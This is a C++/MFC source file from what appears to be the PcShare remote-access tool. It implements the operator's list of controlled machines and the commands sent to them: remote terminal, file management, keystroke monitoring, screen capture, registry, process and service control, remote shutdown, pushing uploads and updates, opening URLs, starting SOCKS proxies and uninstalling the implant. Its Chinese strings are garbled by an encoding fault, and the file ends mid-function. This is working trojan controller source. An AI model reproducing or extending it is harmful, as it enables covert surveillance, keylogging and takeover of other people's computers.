// MyClientManaView.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyClientManaView.h"
#include "MyTopView.h"
#include "MyClientTitleDlg.h"

#include "MySendMessDlg.h"
#include "MySendLinkDlg.h"
#include "MyUpLoadDlg.h"
#include "MyUpdateDlg.h"
#include "MyOpenUrlDlg.h"
#include "MyStartSocksDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView

IMPLEMENT_DYNCREATE(CMyClientManaView, CXTListView)

CMyClientManaView::CMyClientManaView()
{
	m_ExitEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hKeepAliveThread = NULL;
}

CMyClientManaView::~CMyClientManaView()
{
	CloseHandle(m_ExitEvent);
}

BEGIN_MESSAGE_MAP(CMyClientManaView, CXTListView)
	//{{AFX_MSG_MAP(CMyClientManaView)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_NOTIFY_REFLECT(NM_DBLCLK, OnDblclk)
	ON_NOTIFY_REFLECT(NM_RCLICK, OnRclick)
	ON_COMMAND(ID_CLIENT_MANA_TLNT, OnClientManaTlnt)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_TLNT, OnUpdateClientManaTlnt)
	ON_COMMAND(ID_CLIENT_MANA_UNIN, OnClientManaUnin)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_UNIN, OnUpdateClientManaUnin)
	ON_WM_CONTEXTMENU()
	ON_WM_DESTROY()
	ON_WM_COPYDATA()
	ON_COMMAND(ID_CLIENT_MANA_FILE, OnClientManaFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_FILE, OnUpdateClientManaFile)
	ON_COMMAND(ID_CLIENT_MANA_KEYM, OnClientManaKeym)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_KEYM, OnUpdateClientManaKeym)
	ON_COMMAND(ID_CLIENT_MANA_CWND, OnClientManaCwnd)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_CWND, OnUpdateClientManaCwnd)
	ON_COMMAND(ID_CLIENT_MANA_FRAM, OnClientManaFram)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_FRAM, OnUpdateClientManaFram)
	ON_COMMAND(ID_CLIENT_MANA_LINK, OnClientManaLink)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_LINK, OnUpdateClientManaLink)
	ON_COMMAND(ID_CLIENT_MANA_MESS, OnClientManaMess)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_MESS, OnUpdateClientManaMess)
	ON_COMMAND(ID_CLIENT_MANA_MULT, OnClientManaMult)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_MULT, OnUpdateClientManaMult)
	ON_COMMAND(ID_CLIENT_MANA_PROC, OnClientManaProc)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_PROC, OnUpdateClientManaProc)
	ON_COMMAND(ID_CLIENT_MANA_REGT, OnClientManaRegt)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_REGT, OnUpdateClientManaRegt)
	ON_COMMAND(ID_CLIENT_MANA_SERV, OnClientManaServ)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_SERV, OnUpdateClientManaServ)
	ON_COMMAND(ID_CLIENT_PC_RESTART, OnClientPcRestart)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_RESTART, OnUpdateClientPcRestart)
	ON_COMMAND(ID_CLIENT_PC_SHUTDOWN, OnClientPcShutdown)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_SHUTDOWN, OnUpdateClientPcShutdown)
	ON_COMMAND(ID_CLIENT_UPDATE_FILE, OnClientUpdateFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_UPDATE_FILE, OnUpdateClientUpdateFile)
	ON_COMMAND(ID_CLIENT_UPLOAD_FILE, OnClientUploadFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_UPLOAD_FILE, OnUpdateClientUploadFile)
	ON_COMMAND(ID_MODIFY_TITLE, OnModifyTitle)
	ON_UPDATE_COMMAND_UI(ID_MODIFY_TITLE, OnUpdateModifyTitle)
	ON_COMMAND(ID_LIST_SELECT_ALL, OnListSelectAll)
	ON_UPDATE_COMMAND_UI(ID_LIST_SELECT_ALL, OnUpdateListSelectAll)
	ON_COMMAND(ID_LIST_SELECT_NOONE, OnListSelectNoone)
	ON_UPDATE_COMMAND_UI(ID_LIST_SELECT_NOONE, OnUpdateListSelectNoone)
	ON_COMMAND(ID_CLIENT_OPEN_URL, OnClientOpenUrl)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_OPEN_URL, OnUpdateClientOpenUrl)
	ON_COMMAND(ID_CLIENT_START_SOCKS, OnClientStartSocks)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_START_SOCKS, OnUpdateClientStartSocks)
	ON_COMMAND(ID_CLIENT_STOP_SOCKS, OnClientStopSocks)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_STOP_SOCKS, OnUpdateClientStopSocks)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_RESIZE_WND, OnResizeWnd)
	ON_MESSAGE(WM_KEEPALIVE, OnKeepAlive)
	ON_MESSAGE(WM_TRANEVENT, OnTranEvent)
	ON_COMMAND_RANGE(ID_VIEW_NORMAL, ID_VIEW_NORMAL + 36, OnViewNormalExt)
	ON_UPDATE_COMMAND_UI_RANGE(ID_VIEW_NORMAL, ID_VIEW_NORMAL + 36, OnUpdateViewNormalExt)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView drawing

void CMyClientManaView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView diagnostics

#ifdef _DEBUG
void CMyClientManaView::AssertValid() const
{
	CXTListView::AssertValid();
}

void CMyClientManaView::Dump(CDumpContext& dc) const
{
	CXTListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView message handlers

int CMyClientManaView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CXTListView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	CListCtrl& lcCountries = GetListCtrl();
	m_imagelist.Create(16, 16, ILC_COLOR24 |ILC_MASK, 6, 6);
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_USERPC));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_VMM));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_LOCK));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_OPEN));
	lcCountries.SetImageList(&m_imagelist, LVSIL_SMALL);

	AddColumn(_T("�����ƶ�IP��ַ"), 86, LVCFMT_LEFT);
	AddColumn(_T("����汾"), 60, LVCFMT_LEFT);
	AddColumn(_T("�������"), 60, LVCFMT_LEFT);
	AddColumn(_T("�ͻ�ע��"), 60, LVCFMT_LEFT);
	AddColumn(_T("����ϵͳ"), 104, LVCFMT_LEFT);
	AddColumn(_T("CPUƵ��"), 104, LVCFMT_LEFT);
	AddColumn(_T("�ڴ�����"), 104, LVCFMT_LEFT);
	AddColumn(_T("�ͻ����ڵ���"), 60, LVCFMT_LEFT);
	SetExtendedStyle(LVS_EX_SUBITEMIMAGES|LVS_EX_CHECKBOXES|LVS_EX_FULLROWSELECT|LVS_EX_ONECLICKACTIVATE|LVS_EX_UNDERLINEHOT);
	
	SubclassHeader();

	CListCtrl& listCtrl = GetListCtrl();
	::SendMessage(listCtrl.GetSafeHwnd(), LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT);

	m_flatHeader.SetTheme(new CXTHeaderThemeOffice2003());
	m_flatHeader.ThawAllColumns();
	m_flatHeader.ShowSortArrow(TRUE);
	OnResizeWnd(0, 0);
	return 0;
}

bool CMyClientManaView::SortList(int, bool )
{
	CXTSortClass csc (&GetListCtrl(), m_nSortedCol);
	csc.Sort (m_bAscending, xtSortString);
	return true;
}

void CMyClientManaView::InsertItem(MyServerTran* pItem, BOOL IsShowLogs)
{
	//�鿴�ͻ��Ƿ����
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		if(pTran->CheckId(pItem->GetId()))
		{
			pTran->Close();
			delete pTran;
			GetListCtrl().SetItemData(i, (DWORD) pItem);
			GetListCtrl().SetItemText(i, 0, pItem->GetTitle());
			return;
		}
	}

	//���öϿ��¼�
	pItem->SetUnBlock(GetSafeHwnd());
	
	//�����¿ͻ�
	int nItem = -1;
	if(pItem->GetLoginInfo()->m_IsVideo)
	{
		nItem = GetListCtrl().InsertItem(
				LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 
				2, pItem->GetTitle(),
				INDEXTOSTATEIMAGEMASK(1), 
				LVIS_STATEIMAGEMASK, 1,
				(LPARAM) pItem);
	}
	else
	{
		nItem = GetListCtrl().InsertItem(
				LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 
				0, pItem->GetTitle(),
				INDEXTOSTATEIMAGEMASK(1), 
				LVIS_STATEIMAGEMASK, 0,
				(LPARAM) pItem);
	}

	GetListCtrl().SetItemData(nItem, (DWORD) pItem);

	//����汾
	GetListCtrl().SetItemText(nItem, 1, pItem->GetLoginInfo()->m_SoftVer);

	//���������
	GetListCtrl().SetItemText(nItem, 2, pItem->GetLoginInfo()->m_PcName);
	
	//�ͻ�ע��
	GetListCtrl().SetItemText(nItem, 3, pItem->GetNote());

	//����ϵͳ�汾
	TCHAR m_Text[256] = {0};
	switch(pItem->GetLoginInfo()->m_SysType)
	{
		case Windows2003 : lstrcpy(m_Text, _T("Windows2003")); break;
		case Windows2000 : lstrcpy(m_Text, _T("Windows2000")); break;
		case WindowsXP : lstrcpy(m_Text, _T("WindowsXp")); break;
		case Vista : lstrcpy(m_Text, _T("Vista")); break;
		case Windows7 : lstrcpy(m_Text, _T("Windows7")); break;
		default: lstrcpy(m_Text, _T("δ֪ϵͳ"));break;
	}
	GetListCtrl().SetItemText(nItem, 4, m_Text);

	//CPUƵ��
	wsprintf(m_Text, _T("~%d Mhz"), pItem->GetLoginInfo()->m_CpuSpeed);
	GetListCtrl().SetItemText(nItem, 5, m_Text);

	//�ڴ�����
	StrFormatByteSize64(pItem->GetLoginInfo()->m_MemContent, m_Text, 256);
	GetListCtrl().SetItemText(nItem, 6, m_Text);

	//���ڳ���
	GetListCtrl().SetItemText(nItem, 7, pItem->GetRealAddr());

	//�鿴�Ƿ�ֻ��һ��Ԫ��
	if(GetListCtrl().GetItemCount() == 1)
	{
		GetListCtrl().SetItemState(nItem, LVIS_SELECTED, LVIS_SELECTED);
	}
	OnResizeWnd(0, 0);

	//���������߳�
	if(hKeepAliveThread == NULL)
	{
		hKeepAliveThread = (HANDLE) _beginthread(KeepAliveThread, 0, this);
	}

	if(IsShowLogs)
	{
		//��ʾ������Ϣ
		wsprintf(m_Text, _T("�ͻ���%s - %s���Ѿ����� - �������顾%s��"), pItem->GetTitle(), pItem->GetLoginInfo()->m_PcName, pItem->GetViewName());
		GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
	}
}

void CMyClientManaView::OnSize(UINT nType, int cx, int cy) 
{
	CXTListView::OnSize(nType, cx, cy);
	OnResizeWnd(0, 0);
}

void CMyClientManaView::OnDblclk(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	OnClientManaFile();
}

BOOL CMyClientManaView::PreCreateWindow(CREATESTRUCT& cs) 
{
	cs.style ^= LVS_REPORT|LVS_SINGLESEL|LVS_AUTOARRANGE;
	cs.style &= ~WS_BORDER;
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	return CXTListView::PreCreateWindow(cs);
}

void CMyClientManaView::OnRclick(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	AfxGetMainWnd()->PostMessage(WM_CLIENTMAINRCLICK, IDR_MENU_CLIENT_MANAGER, NULL);
}

LRESULT CMyClientManaView::OnResizeWnd(WPARAM wParam, LPARAM lParam)
{
	CRect rect;
	GetClientRect(&rect);

	GetListCtrl().SetColumnWidth(0, rect.Width() *2/10 - 30);
	GetListCtrl().SetColumnWidth(1, rect.Width() *1/10 + 20);
	GetListCtrl().SetColumnWidth(2, rect.Width() *1/10 - 30);
	GetListCtrl().SetColumnWidth(3, rect.Width() *1/10 + 20);
	GetListCtrl().SetColumnWidth(4, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(5, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(6, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(7, rect.Width() *2/10);
	return TRUE;
}

void CMyClientManaView::SetItemNote(LPCTSTR sNote, LPCTSTR sTitle)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		if(GetListCtrl().GetItemText(i, 0) == sTitle)
		{
			GetListCtrl().SetItemText(i, 3, sNote);
		}
	}
}

MyServerTran* CMyClientManaView::GetItemFromId(LPCTSTR sId)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		ASSERT(pTran);
		if(StrCmpI(pTran->GetId(), sId) == 0)
		{
			return pTran;
		}
	}
	return NULL;
}

void CMyClientManaView::SetItemPort(LPCTSTR sPort, LPCTSTR sTitle)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		if(GetListCtrl().GetItemText(i, 0) == sTitle)
		{
			GetListCtrl().SetItemText(i, 7, sPort);
		}
	}
}

void CMyClientManaView::OnClientManaTlnt() 
{
	StartChildProcess(_T("�����ն�"), WM_CONNECT_TLNT);
}

void CMyClientManaView::OnUpdateClientManaTlnt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaUnin() 
{
	if(MessageBox(_T("ȷ��Ҫж�ر����ƶˣ�"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_PRO_UNINSTALL, NULL);
		
		//ɾ�������ļ�
		TCHAR m_Path[512] = {0};
		GetModuleFileName(NULL, m_Path, 500);
		TCHAR* pFind = StrRChr(m_Path, NULL, _T('\\'));
		ASSERT(pFind);

		*(pFind + 1) = 0;
		lstrcat(m_Path, _T("CACHE\\USERINFO\\"));
		lstrcat(m_Path, pItem->GetId());
		lstrcat(m_Path, _T(".ini"));
		DeleteFile(m_Path);
		return;
	}
}

void CMyClientManaView::OnUpdateClientManaUnin(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

MyServerTran* CMyClientManaView::GetCurSelect()
{
	if(GetListCtrl().GetSelectedCount() > 0)
	{
		int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
		if(nItem == -1)
		{
			return NULL;
		}
		return (MyServerTran*) GetListCtrl().GetItemData(nItem);
	}
	return NULL;
}

void CMyClientManaView::StartChildProcess(LPCTSTR sChildWndName, DWORD nCmd)
{
	int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
	if(nItem == -1)
	{
		return;
	}
	
	//���ö����ı�ʶ
	LVITEM m_Item = {0};
	m_Item.mask = LVIF_IMAGE;
	m_Item.iItem = nItem;
	m_Item.iSubItem = 2;
	m_Item.iImage = 3;
	GetListCtrl().SetItem(&m_Item);
	MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(nItem);
	if(pItem != NULL)
	{
		StartChildProcess(sChildWndName, nCmd, pItem);
	}
}

void CMyClientManaView::StartChildProcess(LPCTSTR sChildWndName, DWORD nCmd, MyServerTran* pItem)
{
	TCHAR m_Text[256] = {0};
	wsprintf(m_Text, _T(" title=%s%s-%s;clienttitie=%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;"), 
		PS_TITLE, sChildWndName, pItem->GetTitle(), pItem->GetTitle(), pItem->GetId(), GetSafeHwnd(), 
		AfxGetMainWnd()->GetSafeHwnd(), GetCurrentProcessId(), nCmd);

	//�����µ��ӽ���
	TCHAR m_lpCmdLine[512] = {0};
	GetModuleFileName(NULL, m_lpCmdLine, 500);
	lstrcat(m_lpCmdLine, m_Text);

	if(!IsMulitProcess())
	{
		StartMoudle(m_Text);
	}
	else
	{
		STARTUPINFO st = {0};
		st.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION pi = {0};
		if(!CreateProcess(NULL, m_lpCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &st, &pi))
		{
			MessageBox(_T("��������ʧ��"), _T("��ʾ"), MB_OK|MB_ICONWARNING);
		}
	}
}

void CMyClientManaView::KeepAlive()
{
	while(WaitForSingleObject(m_ExitEvent, 6000) == WAIT_TIMEOUT)
	{
		SendMessage(WM_KEEPALIVE, 0, 0);
	}
}

void CMyClientManaView::KeepAliveThread(LPVOID lPvoid)
{
	CMyClientManaView* pThis = (CMyClientManaView*) lPvoid;
	pThis->KeepAlive();
}

LRESULT CMyClientManaView::OnTranEvent(WPARAM wParam, LPARAM lParam)
{
	SOCKET s = (SOCKET) wParam;
	WORD nEvent = WSAGETSELECTEVENT(lParam);
	if(nEvent == FD_CLOSE)
	{
		for(int i = 0; i < GetListCtrl().GetItemCount(); i++)
		{
			MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pTran->CheckSocket(s))
			{
				//��ʾ������Ϣ
				TCHAR m_Text[256] = {0};
				wsprintf(m_Text, _T("�ͻ���%s - %s���Ѿ����� - �������顾%s��"), 
					pTran->GetTitle(), pTran->GetLoginInfo()->m_PcName, pTran->GetViewName());
				GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
				pTran->Close();
				delete pTran;
				GetListCtrl().DeleteItem(i);
				return TRUE;
			}
		}
	}
	return TRUE;
}

LRESULT CMyClientManaView::OnKeepAlive(WPARAM wParam, LPARAM lParam)
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		if(pTran != NULL)
		{
			pTran->SendAliveCmd();
		}
	}
	return TRUE;
}

void CMyClientManaView::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	CPoint m_point;
	CMenu m_menu;
	m_menu.LoadMenu(IDR_MENU_FILE_MANA);
	InsertViewMenu((CMenu*) (m_menu.GetSubMenu(0)->GetSubMenu(m_menu.GetSubMenu(0)->GetMenuItemCount() - 1)));
	GetCursorPos(&m_point);
	SetForegroundWindow();   
	CXTPCommandBars::TrackPopupMenu(m_menu.GetSubMenu(0), TPM_RIGHTBUTTON, m_point.x, m_point.y, this);
	m_menu.DestroyMenu();
}

void CMyClientManaView::InsertViewMenu(CMenu* pMenu)
{
	//ȡPS_FENZUZONGSHU
	TCHAR sViewCount[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, PS_FENZUZONGSHU, _T("0"), sViewCount, 255, GetIniFileName());
	DWORD nViewCount = StrToInt(sViewCount);

	//�滻0����
	TCHAR m_ViewName[256] = {0};
	GetPrivateProfileString(PS_FENZU, _T("0"), PS_PUTONGKEHUZU, m_ViewName, 255, GetIniFileName());
	pMenu->ModifyMenu(MF_BYPOSITION, 0, MF_STRING, m_ViewName);

	//������������
	int k = ID_VIEW_NORMAL + 1;
	for(DWORD i = 1; i < nViewCount; i++)
	{
		TCHAR m_ViewCount[256] = {0};
		wsprintf(m_ViewCount, _T("%d"), i);
		GetPrivateProfileString(PS_FENZU, m_ViewCount, m_ViewCount, m_ViewName, 255, GetIniFileName());
		pMenu->AppendMenu(MF_STRING, k, m_ViewName);
		k++;
	}
}

void CMyClientManaView::OnDestroy() 
{
	SetEvent(m_ExitEvent);
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		pTran->Close();
		delete pTran;
	}
	CXTListView::OnDestroy();
}

void CMyClientManaView::OnUpdateViewNormalExt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnViewNormalExt(UINT nID) 
{
	CMyTopView* pParentView = (CMyTopView*) GetOwner();
	int i = 0, k = 0;
	int nId = nID - ID_VIEW_NORMAL;
	CString m_SrcViewName = pParentView->GetCurViewName();
	CString m_DesViewName = pParentView->GetViewNameFromId(nId);
	if(m_SrcViewName == m_DesViewName)
	{
		return;
	}

	//�ƶ���Ŀ�����
	int nCheckCount = 0;
	int nCount = GetListCtrl().GetItemCount();
	for(i = 0; i < nCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			pItem->SetViewName(m_DesViewName);
			SetUserInfo(pItem->GetId(), pItem->GetViewName(), PS_INFO_VIEW);
			pParentView->GetViewFromId(nId)->InsertItem(pItem, FALSE);
			nCheckCount ++;
		}
	}

	//����ɾ��
	for(i = 0; i < nCheckCount; i++)
	{
		for(k = 0; k < GetListCtrl().GetItemCount(); k++)
		{
			if(GetListCtrl().GetCheck(k))
			{
				GetListCtrl().DeleteItem(k);
				break;
			}
		}
	}

	//����
	int nSelectCount = GetListCtrl().GetSelectedCount();
	if(nCheckCount == 0 && nSelectCount == 1)
	{
		int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
		if(nItem == -1)
		{
			return;
		}
		MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(nItem);
		pItem->SetViewName(m_DesViewName);
		SetUserInfo(pItem->GetId(), pItem->GetViewName(), PS_INFO_VIEW);
		pParentView->GetViewFromId(nId)->InsertItem(pItem, FALSE);
		GetListCtrl().DeleteItem(nItem);
	}
}

BOOL CMyClientManaView::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	if(pCopyDataStruct->dwData == PS_LOCAL_SENDCMD)
	{
		LPMYCHILDCMDINFO pInfo = (LPMYCHILDCMDINFO) pCopyDataStruct->lpData;
		int iCount = GetListCtrl().GetItemCount();
		for(int i = 0; i < iCount; i++)
		{
			MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pTran->CheckId(pInfo->m_Id))
			{
				pTran->SendCmd(pInfo->m_Info.m_Command, pInfo->m_Info.m_Hwnd);
			}
		}
	}
	return CXTListView::OnCopyData(pWnd, pCopyDataStruct);
}

void CMyClientManaView::OnClientManaFile() 
{
	StartChildProcess(_T("�ļ�����"), WM_CONNECT_FILE);
}

void CMyClientManaView::OnUpdateClientManaFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaKeym() 
{
	StartChildProcess(_T("���̼��"), WM_CONNECT_GET_KEY);
}

void CMyClientManaView::OnUpdateClientManaKeym(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaCwnd() 
{
	StartChildProcess(_T("���ڹ���"), WM_CONNECT_CWND);
}

void CMyClientManaView::OnUpdateClientManaCwnd(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaFram() 
{
	StartChildProcess(_T("��Ļ���"), WM_CONNECT_FRAM);
}

void CMyClientManaView::OnUpdateClientManaFram(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaLink() 
{
	CMySendLinkDlg dlg(this);
	TCHAR m_TitleName[512] = {0};
	GetPrivateProfileString(_T("����"), _T("ָ����ҳ"), _T(""), m_TitleName, 256, GetIniFileName());
	dlg.m_Title = m_TitleName + 1;
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	lstrcpy(m_TitleName + 1, dlg.m_Title);
	if(dlg.m_Type == 0)
	{
		m_TitleName[0] = _T('0');
	}
	else if(dlg.m_Type == 1)
	{
		m_TitleName[0] = _T('1');
	}
	WritePrivateProfileString(_T("����"), _T("ָ����ҳ"), m_TitleName, GetIniFileName());

	char* pData = new char[lstrlen(m_TitleName) + 1024];

	WideCharToMultiByte(CP_ACP, 0, m_TitleName, lstrlen(m_TitleName) + 1, pData, lstrlen(m_TitleName) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(m_TitleName);
	ct.dwData = PS_LOCAL_SEND_LINK;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_LINK, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_LINK, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientManaLink(CCmdUI* pCmdUI) 
{
	int count = GetListCtrl().GetSelectedCount();
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaMess() 
{
	TCHAR m_TitleName[512] = {0};
	GetPrivateProfileString(_T("����"), _T("��ʾ��Ϣ"), _T(""), m_TitleName, 256, GetIniFileName());
	CMySendMessDlg dlg;
	dlg.m_Title = m_TitleName + 1;
	if(dlg.DoModal() != IDOK)
	{
		return;
	}
	lstrcpy(m_TitleName + 1, dlg.m_Title);
	if(dlg.m_Type == 0)
	{
		m_TitleName[0] = _T('0');
	}
	else if(dlg.m_Type == 1)
	{
		m_TitleName[0] = _T('1');
	}
	else
	{
		m_TitleName[0] = _T('2');
	}
	WritePrivateProfileString(_T("����"), _T("��ʾ��Ϣ"), m_TitleName, GetIniFileName());

	char* pData = new char[lstrlen(m_TitleName) + 1024];
	WideCharToMultiByte(CP_ACP, 0, m_TitleName, lstrlen(m_TitleName) + 1, pData, lstrlen(m_TitleName) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(m_TitleName);
	ct.dwData = PS_LOCAL_SEND_MESS;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
